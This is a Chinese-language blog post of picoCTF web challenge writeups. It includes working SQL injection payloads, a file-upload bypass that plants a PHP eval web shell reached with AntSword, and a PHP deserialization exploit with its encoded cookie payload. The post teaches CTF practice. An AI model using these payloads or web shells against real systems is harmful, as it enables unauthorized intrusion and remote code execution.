anzhiyu-icon-hashtag"></i>資安</span></a></span></div></div><h1 class="post-title" itemprop="name headline">All-in-One PicoCTF Writeups</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-06-01T02:27:03.000Z" title="Created 2024-06-01 10:27:03">2024-06-01</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-07-12T12:56:02.325Z" title="Updated 2024-07-12 20:56:02">2024-07-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字數"></i><span class="post-meta-label" title="文章字數">Word count:</span><span class="word-count" title="文章字數">9.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="閱讀時長"></i><span class="post-meta-label" title="閱讀時長">Reading time:</span><span>40min</span></span><span class="post-meta-separator"></span><span id="" data-flag-title="All-in-One PicoCTF Writeups"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="閱讀量">Post views:</span><span id="twikoo_visitors" title="訪問量"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP屬地爲Taiwan"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>Taiwan</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/posts/4f98706e/#post-comment" tabindex="-1"><span id="twikoo-count"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://cx330.tw/posts/4f98706e/"><header><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a><a href="/tags/PicoCTF/" tabindex="-1" itemprop="url">PicoCTF</a><a href="/tags/%E8%B3%87%E5%AE%89/" tabindex="-1" itemprop="url">資安</a><h1 id="CrawlerTitle" itemprop="name headline">All-in-One PicoCTF Writeups</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">CX330</span><time itemprop="dateCreated datePublished" datetime="2024-06-01T02:27:03.000Z" title="Created 2024-06-01 10:27:03">2024-06-01</time><time itemprop="dateCreated datePublished" datetime="2024-07-12T12:56:02.325Z" title="Updated 2024-07-12 20:56:02">2024-07-12</time></header><h1 id="前言">前言</h1>
<p>其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。</p>
<p>自己在刷 PicoCTF 的時候常常發現，幾乎所有的 writeup 都是英文的居多，所以想說來寫個完整一點的中文版！總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題左右才開始打算來寫 writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的 writeup，就這樣啦！希望能幫忙到你。</p>
<h1 id="Web">Web</h1>
<h2 id="unminify">unminify</h2>
<p>先看題目，點開後他會說如果你打開了這個網頁，代表你的瀏覽器已經收到了 flag，只是他不知道要怎麼讀取它。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091116470.png" alt="題目"></p>
<p>既然他說了我們瀏覽器已經收到 flag 了，就打開 F12 看一下網頁代碼吧！點開開發者工具後，直接在 Element 的 Tab 裡面用<code>Ctrl+F</code>搜尋<code>picoCTF</code>字串，結果就直接找到了 XD。欸不是這題也太水了吧！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091535175.png" alt="利用開發者工具搜尋flag"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;pr3tty_c0d3_dbe259ce&#125;</span><br></pre></td></tr></table></figure>
<h2 id="picobrowser">picobrowser</h2>
<p>這題我們點進 URL 後會看到一個 FLAG 的按鈕，按下去會發現我們不能得到 FLAG。<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/SJB9S0p70.png" alt="題目"><br>
他說我們應該要是 picobrowser，所以我就寫了一個 selenium 的 Python 腳本來運行，看看能不能拿到 flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line"><span class="keyword">from</span> webdriver_manager.chrome <span class="keyword">import</span> ChromeDriverManager</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">my_user_agent = <span class="string">&quot;picobrowser&quot;</span> <span class="comment"># 這裡把agent改為picobrowser</span></span><br><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line">chrome_options.add_argument(<span class="string">f&quot;--user-agent=<span class="subst">&#123;my_user_agent&#125;</span>&quot;</span>)</span><br><span class="line">service = Service(executable_path=ChromeDriverManager().install())</span><br><span class="line">driver = webdriver.Chrome(service=service, options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://jupiter.challenges.picoctf.org/problem/28921/flag&quot;</span></span><br><span class="line"></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>
<p>這樣就得到 flag 了！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;p1c0_s3cr3t_ag3nt_84f9c865&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SQLiLite">SQLiLite</h2>
<p>題目是一個登入頁面。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092406670.png" alt="題目"></p>
<p>我們先嘗試用<code>admin, admin</code>登入看看。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092632509.png" alt="Login as admin"></p>
<p>它會說 Login failed，但是我們可以看到它的 SQL 查詢語句是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
<p>所以我們就可以很輕鬆的用 SQL Injection 啦！這邊使用帳號<code>' OR 1=1--</code>登入就可以啦，密碼不用輸入，或是隨便輸入也行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093002857.png" alt="Logged in"></p>
<p>但是他說 flag 在 plainsight 裡面所以我們看不見，那就打開開發者工具用<code>Ctrl+F</code>搜尋吧！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093133835.png" alt="flag"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;L00k5_l1k3_y0u_solv3d_it_d3c660ac&#125;</span><br></pre></td></tr></table></figure>
<h2 id="More-SQLi">More SQLi</h2>
<p>把題目 launch 了之後會進入到一個登入頁面，如下圖。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/BySNOmYUC.png" alt="題目"></p>
<p>然後我們先嘗試使用<code>admin</code>作為帳號密碼登入。帳號密碼都輸入<code>admin</code>後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/r1wnu7KIR.png" alt=""></p>
<p>圖片有點小，總之他顯示的內容就是像下面這樣:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br><span class="line">SQL query: SELECT id FROM users WHERE password = &#x27;admin&#x27; AND username = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
<p>所以我們在這邊把密碼用<code>'OR 1=1 --</code>這串 payload 作為輸入（帳號可以隨便輸入），整個 SQL 的 query 就會變成這樣:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--&#x27; AND username = &#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
<p>可以從上面的代碼高亮的顏色發現，在<code>1=1</code>後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/rJjw6XYUC.png" alt=""></p>
<p>他可以查詢 City 的名稱，但其實一筆資料包含了 City, Address, Phone。分析一下後台可能的 SQL 語句，應該是如下:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> city, address, phone <span class="keyword">FROM</span> &#123;TABLE_NAME&#125; <span class="keyword">WHERE</span> city <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>再來因為題目有告訴我們系統使用的是 SQLite，所以會有一個叫做<code>sqlite_master</code>的表來儲存一些表格的各種資訊。（<a target="_blank" rel="noopener" href="https://blog.csdn.net/luoshabugui/article/details/108327936">資訊來源</a>）</p>
<p>知道這些候我們輸入<code>' UNION SELECT name, sql, 1337 FROM sqlite_master; --</code>讓整個 SQL 語句變成如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> city, address, phone <span class="keyword">FROM</span> &#123;TABLE_NAME&#125; <span class="keyword">WHERE</span> city <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> name, <span class="keyword">sql</span>, <span class="number">1337</span> <span class="keyword">FROM</span> sqlite_master; <span class="comment">--&#x27;;</span></span><br></pre></td></tr></table></figure>
<p>這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是 sqlite_master 的表格內容，如下:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/BysgmNY8R.png" alt="找到flag所在的表格了"></p>
<p>我們可以看到被紅色框框圈住的地方就是我們所想獲得的 flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段 payload<code>' UNION SELECT 1, flag, 1 FROM more_table; --</code>。輸入後就可以看到以下的介面啦！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/SyoSNNtLA.png" alt="flag"></p>
<p>flag 就找到囉！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Trickster">Trickster</h2>
<p>這題的題目是一個可以上傳 png 的網頁，看起來就是文件上船漏洞，頁面如下:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/HkocKNtIA.png" alt="題目"></p>
<p><s>秉持著不知道要幹嘛的時候先掃路徑的精神</s>，可以找到它的 robots.txt，它其中禁止了兩個路徑，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /instructions.txt</span><br><span class="line">Disallow: /uploads/</span><br></pre></td></tr></table></figure>
<p>既然它都禁止了，我們就去看看吧 XD。<code>/uploads/</code>應該就是它的上船後的文件路徑了，而它 instructions.txt 的內容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Let&#x27;s create a web app for PNG Images processing.</span><br><span class="line">It needs to:</span><br><span class="line">Allow users to upload PNG images</span><br><span class="line">	look for &quot;.png&quot; extension in the submitted files</span><br><span class="line">	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain &#x27;PNG&#x27; in hexadecimal: &quot;50 4E 47&quot; )</span><br><span class="line">after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.</span><br></pre></td></tr></table></figure>
<p>所以我們知道後端驗證檔案是否為 png 的方法有二，其一為檢查文件後綴名是否為<code>.png</code>；其二為驗證文件的 magic bytes，看文件在十六進制中的前幾個位元組是否為<code>50 4E 47</code>。</p>
<p>知道了這些信息後，我們先隨便找一張 png 圖片上傳看看吧！（我這邊直接隨便截圖，並命名為<code>hack.png</code>）。並且在 upload 的過程中用 Burp suite 去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為<code>hack.png.php</code>，並在檔案內容的 PNG 以下添加這個<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">php 一句話木馬</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>整個修改完後如下（點開來看可能會比較清楚）:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/Sy7rFrYU0.png" alt="一句話木馬"></p>
<p>上傳完成後，現在這個 shell 就會位於<code>https://my_instance_url/uploads/hack.png.php</code>這個位置上啦。</p>
<p>接下來再用<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">中國蟻劍</a>這款工具去連接那個 web shell 就可以啦，連接過程如下:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/HJo4cSF8A.png" alt="輸入連接資訊"></p>
<p>連接完成後，就可以直接看一下網站的文件，看到以下這個<code>.txt</code>應該就是 flag 了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/SyahqSYLR.png" alt="貌似是flag的文件"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/HJW1sBtI0.png" alt="flag出來了"></p>
<p>於是我們就成功找到了 flag 啦！如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b&#125;</span><br></pre></td></tr></table></figure>
<p>這邊補充一個知識點，來講一下<code>&lt;?php @eval($_POST['shell']);?&gt;</code>到底是在做啥。但因為我也不是很熟 php，所以我們來看看 ChatGPT 大神是怎麼回答的吧！</p>
<blockquote>
<p>當然，這段 PHP 代碼的原理是允許遠程執行伺服器上的 PHP 代碼。這是如何工作的：</p>
<ol>
<li><code>&lt;?php</code> 是 PHP 代碼的開始標記。</li>
<li><code>@eval($_POST['shell']);</code> 中的 <code>eval()</code> 函數執行傳遞給它的字符串作為 PHP 代碼。這裡的代碼來自於 HTTP POST 請求中名為 <code>shell</code> 的變量。</li>
<li><code>@</code> 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。</li>
<li>由於這段代碼執行任意 PHP 代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。</li>
</ol>
<p>簡言之，任何通過 <code>shell</code> 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。</p>
</blockquote>
<p>然後我後來找到了另一篇 writeup，它的 payload 比較酷，是一個即時執行的 input 框，有興趣可以去看一下<a target="_blank" rel="noopener" href="https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18">這篇</a>。</p>
<h2 id="Super-Serial">Super Serial</h2>
<p>這題先讀取<code>/robots.txt</code>發現它有一個禁止的路徑為<code>/admin.phps</code>，這似乎代表著它有支持<code>.phps</code>文件。所以可以到<code>/index.phps</code>裡面看它的源代碼。（<code>phps</code>為 PHP source）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704170553939.png" alt="index.phps"></p>
<p>題目說 Flag 在<code>../flag</code>中，所以解題的思路就是要想辦法讀取到<code>../flag</code>。先把圖片上的程式碼拿出來分析一下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;cookie.php&quot;</span>;  <span class="comment"># 這裡用到了cookie.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$con</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&quot;../users.db&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line">    <span class="variable">$perm_res</span> = <span class="keyword">new</span> <span class="title function_ invoke__">permissions</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$perm_res</span>-&gt;<span class="title function_ invoke__">is_guest</span>() || <span class="variable">$perm_res</span>-&gt;<span class="title function_ invoke__">is_admin</span>()) &#123;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login&quot;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$perm_res</span>))), <span class="title function_ invoke__">time</span>() + <span class="number">86400</span> * <span class="number">30</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: authentication.php&quot;</span>);  <span class="comment"># 這裡重定向到authentication.php</span></span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;&lt;h6 class=&quot;text-center&quot; style=&quot;color:red&quot;&gt;Invalid Login.&lt;/h6&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由於可以透過<code>.phps</code>查看原始代碼，所以先去查看<code>cookie.phps</code>和<code>authentication.phps</code>。可以發現在<code>cookie.php</code>中有以下漏洞：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;login&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$perm</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;login&quot;</span>])));</span><br><span class="line">        <span class="variable">$g</span> = <span class="variable">$perm</span>-&gt;<span class="title function_ invoke__">is_guest</span>();</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$perm</span>-&gt;<span class="title function_ invoke__">is_admin</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Deserialization error. &quot;</span> . <span class="variable">$perm</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>這裡的反序列化是不安全的（題目名稱也有提示是和 Serial 有關），如果反序列化失敗，進入到 catch error 裡面，就會把<code>$perm</code>輸出。在<code>authentication.php</code>裡面的<code>access_log</code>這個類中，他定義了<code>__toString()</code>就是讀取並回傳<code>log_file</code>的內容。</p>
<p>所以我們只要建立一個<code>login</code>的 cookie，並輸入錯誤的值，就可以觸發反序列化的錯誤。下圖中我設置了<code>login</code>的值為<code>TEST</code>，成功觸發反序列化錯誤的訊息。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160307961.png" alt="Deserialization error"></p>
<p>接著我們用<a target="_blank" rel="noopener" href="https://onlinephp.io/">PHP Sandbox</a>來線上寫一些 php 的程式碼。這邊會這樣寫是因為我們從<code>cookie.phps</code>中可以看到原始碼是先 URL decode 再 Base64 decode，最後才反序列化。所以整個流程就是反過來就對了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="string">&quot;TEST&quot;</span>))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>他這邊輸出了<code>czo0OiJURVNUIjs%3D</code>，我們把 cookie 的值修改為這個試試看，能不能正確的輸出<code>TEST</code>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160839984.png" alt="PoC"></p>
<p>成功！再來我們只需要 new 一個 access_log 的 class，並且把他的<code>$log_file</code>設定為<code>&quot;../flag&quot;</code>就可以了！Exploit 如下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">access_log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log_file</span> = <span class="string">&quot;../flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">access_log</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面這個代碼執行後會得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9</span><br></pre></td></tr></table></figure>
<p>這個就是我們最終的 Payload 啦，把它貼到<code>login</code>的 cookie 的 value，並重新整理頁面試試看吧。</p>
